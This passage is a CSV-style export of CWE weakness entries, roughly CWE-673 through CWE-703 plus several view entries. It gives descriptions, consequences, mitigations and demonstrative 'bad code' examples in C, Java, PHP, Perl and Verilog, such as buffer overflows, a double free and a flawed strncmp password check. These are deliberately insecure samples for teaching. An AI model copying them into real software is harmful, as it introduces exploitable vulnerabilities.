&message[1][0];int success = processMessageBody(messageBody);if (success == ERROR) {result = ERROR;logError(""Error processing message"", messageBody);free(messageBody);}...",无可能的缓解方案
CWE-673: External Influence of Sphere Definition,The product does not prevent the definition of control spheres from external actors.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a ""publisher;"" commenting on articles, only accessible to a ""commenter"" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions.Example 2In Untrusted Search Path (CWE-426), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product's intended sphere of control would include ""resources that are only modifiable by the person who installed the product."" The PATH effectively changes the definition of this sphere so that it overlaps the attacker's sphere of control.",无可能的缓解方案
CWE-674: Uncontrolled Recursion,"The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Resources including CPU, memory, and stack memory could be rapidly consumed or exhausted, eventually leading to an exit or crash., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataIn some cases, an application's interpreter might kill a process or thread that appears to be consuming too much resources, such as with PHP's memory_limit setting. When the interpreter kills the process/thread, it might report an error containing detailed information such as the application's installation path., Likelihood: ","Example 1In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted.(bad code)Example Language:Cvoid do_something_recursive (int flg){... // Do some real work here, but the value of flg is unmodifiedif (flg) { do_something_recursive (flg); }    // flg is never modified so it is always TRUE - this call will continue until the stack explodes}int flag = 1; // Set to TRUEdo_something_recursive (flag);Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive call to return.(good code)Example Language:Cvoid do_something_recursive (int flg){... // Do some real work here// Modify value of flg on done conditionif (flg) { do_something_recursive (flg); }    // returns when flg changes to 0}int flag = 1; // Set to TRUEdo_something_recursive (flag);","Phase:  ImplementationEnsure an end condition will be reached under all logic conditions. The end condition may include testing against the depth of recursion and exiting with an error if the recursion goes too deep. The complexity of the end condition contributes to the effectiveness of this action.Effectiveness: ModeratePhase:  ImplementationIncrease the stack size.Effectiveness: LimitedNote:Increasing the stack size might only be a temporary measure, since the stack typically is still not very large, and it might remain easy for attackers to cause an out-of-stack fault."
CWE-675: Multiple Operations on Resource in Single-Operation Context,"The product performs the same operation on a resource two or more times, when the operation should only be applied once.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1The following code shows a simple example of a double free vulnerability.(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);...if (abrt) {free(ptr);}...free(ptr);Double free vulnerabilities have two common (and sometimes overlapping) causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for freeing the memoryAlthough some double free vulnerabilities are not much more complicated than this example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once.Example 2This code binds a server socket to port 21, allowing the server to listen for traffic on that port.(bad code)Example Language:Cvoid bind_socket(void) {int server_sockfd;int server_len;struct sockaddr_in server_address;/*unlink the socket if already bound to avoid an error when bind() is called*/unlink(""server_socket"");server_sockfd = socket(AF_INET, SOCK_STREAM, 0);server_address.sin_family = AF_INET;server_address.sin_port = 21;server_address.sin_addr.s_addr = htonl(INADDR_ANY);server_len = sizeof(struct sockaddr_in);bind(server_sockfd, (struct sockaddr *) &s1, server_len);}This code may result in two servers binding a socket to same port, thus receiving each other's traffic. This could be used by an attacker to steal packets meant for another process, such as a secure FTP server.",无可能的缓解方案
CWE-676: Use of Potentially Dangerous Function,"The product invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.","Scope: Other, Impact: Technical Impact:Varies by Context; Quality Degradation; Unexpected StateIf the function is used incorrectly, then it could result in security problems., Likelihood: ","Example 1The following code attempts to create a local copy of a buffer to perform some manipulations to the data.(bad code)Example Language:Cvoid manipulate_string(char * string){char buf[24];strcpy(buf, string);...}However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter.","Phases:  Build and Compilation; ImplementationIdentify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the ""banned.h"" include file from Microsoft's SDL. [REF-554] [REF-7]"
CWE VIEW: Weakness Base Elements,This view (slice) displays only weakness base elements.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Composites,This view displays only composite weaknesses.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: DEPRECATED: Chain Elements,"This view has been deprecated. It has limited utility for stakeholders, since all weaknesses can be links in a chain.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-680: Integer Overflow to Buffer Overflow,"The product performs a calculation to determine how much memory to allocate, but an integer overflow can occur that causes less memory to be allocated than expected, leading to a buffer overflow.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands, Likelihood: ","Example 1The following image processing code allocates a table for images.(bad code)Example Language:Cimg_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).",无可能的缓解方案
CWE-681: Incorrect Conversion between Numeric Types,"When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.","Scope: OtherIntegrity, Impact: Technical Impact:Unexpected State; Quality DegradationThe program could wind up using the wrong number and generate incorrect results. If the number is used to allocate resources or make a security decision, then this could introduce a vulnerability., Likelihood: ","Example 1In the following Java example, a float literal is cast to an integer, thus causing a loss of precision.(bad code)Example Language:Javaint i = (int) 33457.8f;Example 2This code adds a float and an integer together, casting the result to an integer.(bad code)Example Language:PHP$floatVal = 1.8345;$intVal = 3;$result = (int)$floatVal + $intVal;Normally, PHP will preserve the precision of this operation, making $result = 4.8345. After the cast to int, it is reasonable to expect PHP to follow rounding convention and set $result = 5. However, the explicit cast to int always rounds DOWN, so the final value of $result is 4. This behavior may have unintended consequences.Example 3In this example the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned int, amount will be implicitly converted to unsigned.(bad code)Example Language:Cunsigned int readdata () {int amount = 0;...if (result == ERROR)amount = -1;...return amount;}If the error condition in the code above is met, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers.Example 4In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number.(bad code)Example Language:Cunsigned int readdata () {int amount = 0;...amount = accessmainframe();...return amount;}If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers.",Phase:  ImplementationAvoid making conversion between numeric types. Always check for the allowed ranges.
CWE-682: Incorrect Calculation,The product performs a calculation that generates incorrect or unintended results that are later used in security-critical decisions or resource management.,"Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf the incorrect calculation causes the program to move into an unexpected state, it may lead to a crash or impairment of service., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (Other); Execute Unauthorized Code or CommandsIf the incorrect calculation is used in the context of resource allocation, it could lead to an out-of-bounds operation (CWE-119) leading to a crash or even arbitrary code execution. Alternatively, it may result in an integer overflow (CWE-190) and / or a resource consumption problem (CWE-400)., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIn the context of privilege or permissions assignment, an incorrect calculation can provide an attacker with access to sensitive resources., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf the incorrect calculation leads to an insufficient comparison (CWE-697), it may compromise a protection mechanism such as a validation routine and allow an attacker to bypass the security-critical code., Likelihood:","Example 1The following image processing code allocates a table for images.(bad code)Example Language:Cimg_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).Example 2This code attempts to calculate a football team's average number of yards gained per touchdown.(bad code)Example Language:Java...int touchdowns = team.getTouchdowns();int yardsGained = team.getTotalYardage();System.out.println(team.getName() + "" averages "" + yardsGained / touchdowns + ""yards gained for every touchdown scored"");...The code does not consider the event that the team they are querying has not scored a touchdown, but has gained yardage. In that case, we should expect an ArithmeticException to be thrown by the JVM. This could lead to a loss of availability if our error handling code is not set up correctly.Example 3This example attempts to calculate the position of the second byte of a pointer.(bad code)Example Language:Cint *p = x;char * second_char = (char *)(p + 1);In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment.","Phase:  ImplementationUnderstand your programming language's underlying representation and how it interacts with numeric calculation. Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, ""not-a-number"" calculations, and how your language handles numbers that are too large or too small for its underlying representation.Phase:  ImplementationStrategy:  Input ValidationPerform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.Phase:  ImplementationUse the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity.Phase:  Architecture and DesignStrategy:  Language SelectionUse languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).Phase:  ImplementationStrategy:  Compilation or Build HardeningExamine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.Phase:  TestingUse dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
CWE-683: Function Call With Incorrect Order of Arguments,"The product calls a function, procedure, or routine, but the caller specifies the arguments in an incorrect order, leading to resultant weaknesses.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order.(bad code)Example Language:PHPfunction authenticate($username, $password) {// authenticate user...}authenticate($_POST['password'], $_POST['username']);","Phase:  ImplementationUse the function, procedure, or routine as specified.Phase:  TestingBecause this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type."
CWE-684: Incorrect Provision of Specified Functionality,"The code does not function according to its published specifications, potentially leading to incorrect usage.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following snippet from a doPost() servlet method, the server returns ""200 OK"" (default) even if an error occurs.(bad code)Example Language:Javatry {// Something that may throw an exception....} catch (Throwable t) {logger.error(""Caught: "" + t.toString());return;}Example 2In the following example, an HTTP 404 status code is returned in the event of an IOException encountered in a Java servlet. A 404 code is typically meant to indicate a non-existent resource and would be somewhat misleading in this case.(bad code)Example Language:Javatry {// something that might throw IOException...} catch (IOException ioe) {response.sendError(SC_NOT_FOUND);}",Phase:  ImplementationEnsure that your code strictly conforms to specifications.
CWE-685: Function Call With Incorrect Number of Arguments,"The product calls a function, procedure, or routine, but the caller specifies too many arguments, or too few arguments, which may lead to undefined behavior and resultant weaknesses.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ",无示范例子,Phase:  TestingBecause this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
CWE-686: Function Call With Incorrect Argument Type,"The product calls a function, procedure, or routine, but the caller specifies an argument that is the wrong data type, which may lead to resultant weaknesses.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ",无示范例子,Phase:  TestingBecause this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
CWE-687: Function Call With Incorrectly Specified Argument Value,"The product calls a function, procedure, or routine, but the caller specifies an argument that contains the wrong value, which may lead to resultant weaknesses.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit.(bad code)Example Language:Perlsub ReportAuth {my ($username, $result, $fatal) = @_;PrintLog(""auth: username=%s, result=%d"", $username, $result);if (($result ne ""success"") && $fatal) {die ""Failed!\n"";}}sub PrivilegedFunc{my $result = CheckAuth($username);ReportAuth($username, $result, 0);DoReallyImportantStuff();}",无可能的缓解方案
CWE-688: Function Call With Incorrect Variable or Reference as Argument,"The product calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles.(bad code)Example Language:Javaprivate static final String[] ADMIN_ROLES = ...;public boolean void accessGranted(String resource, String user) {String[] userRoles = getUserRoles(user);return accessGranted(resource, ADMIN_ROLES);}private boolean void accessGranted(String resource, String[] userRoles) {// grant or deny access based on user roles...}",Phase:  TestingBecause this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
CWE-689: Permission Race Condition During Resource Copy,"The product, while copying or cloning a resource, does not set the resource's permissions or access control until the copy is complete, leaving the resource exposed to other spheres while the copy is taking place.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-690: Unchecked Return Value to NULL Pointer Dereference,"The product does not check for an error after calling a function that can return with a NULL pointer if the function fails, which leads to a resultant NULL pointer dereference.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart, Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Read Memory; Modify MemoryIn rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution., Likelihood:","Example 1The code below makes a call to the getUserName() function but doesn't check the return value before dereferencing (which may cause a NullPointerException).(bad code)Example Language:JavaString username = getUserName();if (username.equals(ADMIN_USER)) {...}Example 2This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().Note that this code is also vulnerable to a buffer overflow (CWE-119).",无可能的缓解方案
CWE-691: Insufficient Control Flow Management,"The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways.","Scope: Other, Impact: Technical Impact:Alter Execution Logic, Likelihood: ","Example 1The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}Example 2In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false.(bad code)Example Language:Cif (condition==true)Do_X();Do_Y();This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability.Example 3This function prints the contents of a specified file requested by a user.(bad code)Example Language:PHPfunction printFile($username,$filename){//read file into string$file = file_get_contents($filename);if ($file && isOwnerOf($username,$filename)){echo $file;return true;}else{echo 'You are not authorized to view this file';}return false;}This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway.",无可能的缓解方案
CWE-692: Incomplete Denylist to Cross-Site Scripting,"The product uses a denylist-based protection mechanism to defend against XSS attacks, but the denylist is incomplete, allowing XSS variants to succeed.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,无可能的缓解方案
CWE-693: Protection Mechanism Failure,The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-694: Use of Multiple Resources with Duplicate Identifier,"The product uses multiple resources that can have the same identifier, in a context in which unique identifiers are required.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf unique identifiers are assumed when protecting sensitive resources, then duplicate identifiers might allow attackers to bypass the protection., Likelihood: ; Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1These two Struts validation forms have the same name.(bad code)Example Language:XML<form-validation><formset><form name=""ProjectForm""> ... </form><form name=""ProjectForm""> ... </form></formset></form-validation>It is not certain which form will be used by Struts. It is critically important that validation logic be maintained and kept in sync with the rest of the product.","Phase:  Architecture and DesignWhere possible, use unique identifiers. If non-unique identifiers are detected, then do not operate any resource with a non-unique identifier and report the error appropriately."
CWE-695: Use of Low-Level Functionality,The product uses low-level functionality that is explicitly prohibited by the framework or specification under which the product is supposed to operate.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1The following code defines a class named Echo. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user. The following C code defines the native method implemented in the Echo class:(bad code)Example Language:Javaclass Echo {public native void runEcho();static {System.loadLibrary(""echo"");}public static void main(String[] args) {new Echo().runEcho();}}(bad code)Example Language:C#include <jni.h>#include ""Echo.h""//the java class above compiled with javah#include <stdio.h>JNIEXPORT void JNICALLJava_Echo_runEcho(JNIEnv *env, jobject obj){char buf[64];gets(buf);printf(buf);}Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of gets(), which does not check the length of its input.The Sun Java(TM) Tutorial provides the following description of JNI [See Reference]: The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them.The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java. Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information exposure in the Java application that reveals its use of JNI [See Reference].Example 2The following example opens a socket to connect to a remote server.(bad code)Example Language:Javapublic void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {// Perform servlet tasks....// Open a socket to a remote server (bad).Socket sock = null;try {sock = new Socket(remoteHostname, 3000);// Do something with the socket....} catch (Exception e) {...}}A Socket object is created directly within the Java servlet, which is a dangerous way to manage remote connections.",无可能的缓解方案
CWE-696: Incorrect Behavior Order,"The product performs multiple related behaviors, but the behaviors are performed in the wrong order in ways which may produce resultant weaknesses.","Scope: Integrity, Impact: Technical Impact:Alter Execution Logic, Likelihood: ","Example 1The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string ""/safe_dir/"".(bad code)Example Language:JavaString path = getInputPath();if (path.startsWith(""/safe_dir/"")){File f = new File(path);return f.getCanonicalPath();}The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of ""/safe_dir/../"" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just ""/"".To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue.(good code)Example Language:JavaString path = getInputPath();File f = new File(path);if (f.getCanonicalPath().startsWith(""/safe_dir/"")){return f.getCanonicalPath();}Example 2This function prints the contents of a specified file requested by a user.(bad code)Example Language:PHPfunction printFile($username,$filename){//read file into string$file = file_get_contents($filename);if ($file && isOwnerOf($username,$filename)){echo $file;return true;}else{echo 'You are not authorized to view this file';}return false;}This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway.Example 3Assume that the module foo_bar implements a protected register. The register content is the asset. Only transactions made by user id (indicated by signal usr_id) 0x4 are allowed to modify the register contents. The signal grant_access is used to provide access.(bad code)Example Language:Verilogmodule foo_bar(data_out, usr_id, data_in, clk, rst_n);output reg [7:0] data_out;input wire [2:0] usr_id;input wire [7:0] data_in;input wire clk, rst_n;wire grant_access;always @ (posedge clk or negedge rst_n)beginif (!rst_n)data_out = 0;elsedata_out = (grant_access) ? data_in : data_out;assign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;endendmoduleThis code uses Verilog blocking assignments for data_out and grant_access. Therefore, these assignments happen sequentially (i.e., data_out is updated to new value first, and grant_access is updated the next cycle) and not in parallel. Therefore, the asset data_out is allowed to be modified even before the access control check is complete and grant_access signal is set. Since grant_access does not have a reset value, it will be meta-stable and will randomly go to either 0 or 1.Flipping the order of the assignment of data_out and grant_access should solve the problem. The correct snippet of code is shown below.(good code)Example Language:Verilogalways @ (posedge clk or negedge rst_n)beginif (!rst_n)data_out = 0;elseassign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;data_out = (grant_access) ? data_in : data_out;endendmodule",无可能的缓解方案
CWE-697: Incorrect Comparison,"The product compares two entities in a security-relevant context, but the comparison is incorrect, which may lead to resultant weaknesses.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year.(bad code)Example Language:Javapublic class Truck {private String make;private String model;private int year;public boolean equals(Object o) {if (o == null) return false;if (o == this) return true;if (!(o instanceof Truck)) return false;Truck t = (Truck) o;return (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));}}Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included.Example 2This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded.(bad code)Example Language:C/* IgnoreCWE-259(hard-coded password) andCWE-309(use of password system for authentication) for this example. */char *username = ""admin"";char *pass = ""password"";int AuthenticateUser(char *inUser, char *inPass) {if (strncmp(username, inUser, strlen(inUser))) {logEvent(""Auth failure of username using strlen of inUser"");return(AUTH_FAIL);}if (! strncmp(pass, inPass, strlen(inPass))) {logEvent(""Auth success of password using strlen of inUser"");return(AUTH_SUCCESS);}else {logEvent(""Auth fail of password using sizeof"");return(AUTH_FAIL);}}int main (int argc, char **argv) {int authResult;if (argc < 3) {ExitError(""Usage: Provide a username and password"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult == AUTH_SUCCESS) {DoAuthenticatedTask(argv[1]);}else {ExitError(""Authentication failed"");}}In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.As a result, this partial comparison leads to improper authentication (CWE-287).Any of these passwords would still cause authentication to succeed for the ""admin"" user:(attack code)ppapaspassThis significantly reduces the search space for an attacker, making brute force attacks more feasible.The same problem also applies to the username, so values such as ""a"" and ""adm"" will succeed for the username.While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness.",无可能的缓解方案
CWE-698: Execution After Redirect (EAR),"The web application sends a redirect to another location, but instead of exiting, it executes additional code.","Scope: OtherConfidentialityIntegrityAvailability, Impact: Technical Impact:Alter Execution Logic; Execute Unauthorized Code or CommandsThis weakness could affect the control flow of the application and allow execution of untrusted code., Likelihood: ","Example 1This code queries a server and displays its status when a request comes from an authorized IP address.(bad code)Example Language:PHP$requestingIP = $_SERVER['REMOTE_ADDR'];if(!in_array($requestingIP,$ipAllowList)){echo ""You are not authorized to view this page"";http_redirect($errorPageURL);}$status = getServerStatus();echo $status;...This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212).",无可能的缓解方案
CWE VIEW: Software Development,"This view organizes weaknesses around concepts that are frequently used or encountered in software development. This includes all aspects of the software development lifecycle including both architecture and implementation. Accordingly, this view can align closely with the perspectives of architects, developers, educators, and assessment vendors. It provides a variety of categories that are intended to simplify navigation, browsing, and mapping.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Seven Pernicious Kingdoms,This view (graph) organizes weaknesses using a hierarchical structure that is similar to that used by Seven Pernicious Kingdoms.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Introduced During Design,This view (slice) lists weaknesses that can be introduced during design.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Introduced During Implementation,This view (slice) lists weaknesses that can be introduced during implementation.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-703: Improper Check or Handling of Exceptional Conditions,The product does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the product.,"Scope: ConfidentialityAvailabilityIntegrity, Impact: Technical Impact:Read Application Data; DoS: Crash, Exit, or Restart; Unexpected State, Likelihood: ","Example 1Consider the following code segment:(bad code)Example Language:Cchar buf[10], cp_buf[10];fgets(buf, 10, stdin);strcpy(cp_buf, buf);The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy().Example 2The following method throws three types of exceptions.(good code)Example Language:Javapublic void doExchange() throws IOException, InvocationTargetException, SQLException {...}While it might seem tidier to write(bad code)public void doExchange() throws Exception {...}doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of doExchange() introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement.",无可能的缓解方案
